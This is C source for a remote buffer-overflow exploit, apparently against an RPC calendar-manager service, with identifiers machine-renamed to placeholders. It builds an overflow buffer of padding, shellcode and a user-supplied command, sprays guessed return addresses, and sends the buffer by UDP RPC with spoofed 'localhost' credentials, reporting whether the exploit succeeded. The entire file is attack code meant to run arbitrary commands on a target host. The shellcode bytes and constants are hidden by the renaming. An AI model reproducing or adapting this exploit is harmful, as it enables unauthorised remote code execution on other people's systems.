
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_5__ TYPE_1__ ;


struct timeval {int member_0; int member_1; } ;
struct cm_send {char* s1; char* s2; } ;
struct cm_reply {int dummy; } ;
typedef enum clnt_stat { ____Placeholder_clnt_stat } clnt_stat ;
typedef int caddr_t ;
struct TYPE_5__ {int cl_auth; } ;
typedef TYPE_1__ CLIENT ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 char VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 long FUNC_0 (char*) ;
 int FUNC_1 (char*,int ,int ,int ,int *) ;
 int FUNC_2 (TYPE_1__*,int ,int ,int ,int ,int ,struct timeval) ;
 TYPE_1__* FUNC_3 (char*,int ,int ,char*) ;
 int FUNC_4 (TYPE_1__*) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (int) ;
 long FUNC_7 () ;
 int FUNC_8 (char*,...) ;
 char* VAR_10 ;
 int FUNC_9 (char*) ;
 int VAR_11 ;
 int VAR_12 ;

int
FUNC_10(int VAR_13, char *VAR_14[])
{
   char VAR_15[VAR_1 + 1];
   long VAR_16, VAR_17;
   int VAR_18, VAR_19, VAR_20;
   char *VAR_21, *VAR_22;

   CLIENT *VAR_23;
   struct cm_send VAR_24;
   struct cm_reply VAR_25;
   struct timeval VAR_26 = { 10, 0 };
   enum clnt_stat VAR_27;

   if(VAR_13 < 3 || VAR_13 > 4) {
      FUNC_8("Usage: %s [hostname] [command] [offset]\n", VAR_14[0]);
      FUNC_6(1);
   }

   VAR_22 = VAR_14[1];
   VAR_21 = VAR_14[2];

   if(VAR_13 == 4) VAR_17 = FUNC_0(VAR_14[3]);
   else VAR_17=0;

   VAR_18 = FUNC_9(VAR_21);
   VAR_18++;
   VAR_18 = -VAR_18;
   VAR_10[VAR_5+0] = (VAR_18 >> 0) & 0xff;
   VAR_10[VAR_5+1] = (VAR_18 >> 8) & 0xff;
   VAR_10[VAR_5+2] = (VAR_18 >> 16) & 0xff;
   VAR_10[VAR_5+3] = (VAR_18 >> 24) & 0xff;

   VAR_10[30] = (char)(FUNC_9(VAR_21) + 27);

   VAR_16 = FUNC_7() + VAR_17;

   for(VAR_19=0; VAR_19<VAR_1; VAR_19++) VAR_15[VAR_19] = VAR_6;

   VAR_19 = VAR_1 - VAR_7 - FUNC_9(VAR_10) - FUNC_9(VAR_21) - 1 - VAR_0;

   for(VAR_20=0; VAR_20<FUNC_9(VAR_10); VAR_20++)
      VAR_15[VAR_19++] = VAR_10[VAR_20];

   for(VAR_20=0; VAR_20<FUNC_9(VAR_21); VAR_20++)
      VAR_15[VAR_19++] = VAR_21[VAR_20];

   VAR_15[VAR_19] = '\xff';

   VAR_19 = VAR_9;
   for(VAR_20=0; VAR_20<(VAR_7/4); VAR_20++, VAR_19=VAR_19+4)
      *((int *)&VAR_15[VAR_19]) = VAR_16;

   VAR_15[VAR_19] = 0x00;

   FUNC_8("host = %s\n", VAR_22);
   FUNC_8("command = '%s'\n", VAR_21);
   FUNC_8("ret address = 0x%x\n", VAR_16);
   FUNC_8("buffer size = %d\n", FUNC_9(VAR_15));

   VAR_24.s1 = VAR_15;
   VAR_24.s2 = "";

   VAR_23 = FUNC_3(VAR_22, VAR_3, VAR_4, "udp");
   if(VAR_23 == ((void*)0)) {
      FUNC_5("clnt_create");
      FUNC_8("exploit failed; unable to contact RPC server\n");
      FUNC_6(1);
   }
   VAR_23->cl_auth = FUNC_1("localhost", 0, 0, 0, ((void*)0));
   VAR_27 = FUNC_2(VAR_23, VAR_2, VAR_12, (caddr_t) &VAR_24,
                        VAR_11, (caddr_t) &VAR_25, VAR_26);
   if(VAR_27 == VAR_8) {
      FUNC_8("exploit is failed!!\n");
      FUNC_4(VAR_23);
      FUNC_6(1);
   } else {
      FUNC_8("Maybe, exploit is success!!\n");
      FUNC_4(VAR_23);
      FUNC_6(0);
   }
}
